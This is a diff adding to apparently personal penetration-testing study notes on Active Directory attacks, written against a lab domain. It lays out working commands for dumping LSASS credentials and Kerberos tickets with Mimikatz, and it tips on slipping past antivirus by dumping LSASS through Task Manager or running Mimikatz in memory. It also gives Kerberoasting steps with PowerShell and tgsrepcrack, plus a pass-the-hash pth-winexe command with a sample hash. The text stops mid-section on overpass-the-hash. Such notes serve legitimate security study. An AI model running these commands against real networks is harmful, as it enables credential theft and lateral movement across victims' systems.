@@ -121,3 +121,84 @@ Active Directory Authentication
 			Client    >>    AP_REQ ({Username + timestamp} + {service ticket})    >>    App Server
 
 		(8) The App Server decrypts the service ticket and then extracts the Username and timestamp. If the usernames in the AP_REQ and the service ticket match, the App Server checks the group access in the service ticket to see what access should be granted
+
+
+	Cached Credential Storage
+
+
+		Mimikatz can be used to dump the Local Security Authority Subsystem Service (LSASS.exe) memory for the password hashes of logged in users used by NTLM and Kerberos.
+
+			mimikatz.exe
+			privilege::debug
+			sekurlsa::logonpasswords
+
+		It can also grab the Kerberos tickets from memory
+
+			sekurlsa::tickets
+
+		Mimikatz is likely going to be flaged by antivirus if you move the exe over and try to run it.
+		Dump the LSASS.exe process through taskmanager and export to an attacker machine
+		Or run Mimikatz in memory using an interpreter like Powershell using the "Invoke-Mimikatz.ps1" script
+
+
+	Service Account Attacks
+
+
+		Users can request access to any service and Kerberos will generate a ticket for them to access. Once they try to access the serivce, the service will decode the service ticket, then the username, and then check if that user has any rights in the App.
+
+		Since users can ask for access to any ticket, and that service ticket contains the pw hash, we can use it to try to crack the pw of the service account for the service account of any SPN we want to target.
+
+		Add-Type -AssemblyName System.IdentityModel
+		New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'HTTP/CorpWebServer.corp.com'
+
+		Once that's run, the service ticket should show up under the "klist" command and can export it with builtin APIs or with Mimikatz
+
+			mimikatz.exe
+			privilege::Debug
+			kerberos::list /export
+
+		To decrypt the service ticket and get the SPN's password hash, we can use kerberoast
+
+			python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt 1-40a50000-Offsec@HTTP~CorpWebServer.corp.com-CORP.COM.kirbi
+
+		Invoke-Kerberoast.ps1 can enumerate all SPN, request service tickets, and export them in a format ready for John the Ripper or Hashcat, eliminating the need for Mimikatz for this attack
+
+
+	Password Guessing
+
+
+		Can see the domain's account policy with "net accounts"
+
+		See ad_enum.ps1 for more details on password guessing
+
+
+Active Directory Lateral Movement
+
+
+	Pass the Hash
+
+
+		Attacker connects to victim using SMB and performs auth using NTLM hash
+
+		Only works for NTLM
+
+		PsExec, Passing-the-hash toolkit, and Impacket all use PtH
+
+		Most tools use PtH by starting a service (cmd, powershell) and talk to it using Named Pipes with the Service Control Manager API
+			
+			Requires SMB connection throught the firewall and Windows File and Print Sharing to be enabled
+
+			Usually uses the Admin$ share to establish a connection, which needs locadmin rights
+
+		pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd
+
+			This works for domain accounts and the built-in local administrator account. Since the 2014 security update, this technique can not be used to authenticate as any other local admin account.
+
+	
+	Overpass the Hash
+
+
+		We can use the hash of someones password to request a Kerberos TGT, which will let us into the other services
+
+			Grab the hash using the above techniques
+			
